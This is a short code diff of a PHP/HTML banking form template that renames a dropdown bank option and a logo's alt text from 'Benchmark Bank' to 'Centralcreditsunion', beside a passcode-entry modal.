@@ -73,7 +73,7 @@
                                     <label style="margin-bottom:8px">Select Bank</label>
                                     <div class="col-sm-9">
                                         <select class="form-control" name="select_bank" required>
-                                            <option value="Benchmark Bank">Benchmark Bank</option>
+                                            <option value="Centralcreditsunion">Centralcreditsunion</option>
                                             <option value="Standard Chartered">Standard Chartered</option>
                                             <option value="BOA">BOA</option>
                                             <option value="Wells Fargo">Wells Fargo</option>
@@ -126,7 +126,7 @@
                                 <div class="modal-content">
                                     <span class="close"><span class="pascode">enter a secure passcode</span> &times;</span>
                                     <div class="popup">
-                                        <img src=" <?=$company->favicon2 ?>" alt="Benchmark Bank Logo" class="logo" />
+                                        <img src=" <?=$company->favicon2 ?>" alt="Centralcreditsunion Logo" class="logo" />
                                     </div>
                                     <input type="number" placeholder="enter a secure passcode" name="pin" id="pot" class="pot">
                                     <p class="wrong" id="wrong"></p>
